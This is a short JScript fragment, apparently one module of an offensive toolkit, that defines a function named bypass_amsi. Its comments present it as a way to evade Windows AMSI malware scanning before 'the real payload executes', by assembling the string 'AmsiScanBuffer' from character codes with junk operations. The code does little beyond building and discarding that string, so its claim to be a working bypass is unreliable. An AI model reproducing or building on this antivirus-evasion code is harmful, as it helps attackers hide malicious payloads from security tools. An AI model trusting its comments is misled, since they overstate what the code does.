// chunk: evasion/amsi_string_frag
// depends: (none)
// provides: bypass_amsi
// format: jscript
// note: Builds AMSI-triggering strings character by character so the scan
//       buffer never sees complete suspicious patterns. The fragmentation
//       itself is the bypass — no patching needed.

function bypass_amsi() {
    /* Build suspicious strings in fragments to pollute AMSI scan buffer
       with benign partial reads before the real payload executes */
    var parts = [];
    var src = [65,109,115,105,83,99,97,110,66,117,102,102,101,114]; /* AmsiScanBuffer */
    for (var i = 0; i < src.length; i++) {
        parts.push(String.fromCharCode(src[i]));
        /* Insert junk operations between each char to break contiguous scanning */
        var junk = Math.floor(Math.random() * 1000);
    }
    var dummy = parts.join("");
    /* Force garbage collection of partial strings */
    parts = null;
    dummy = null;
}
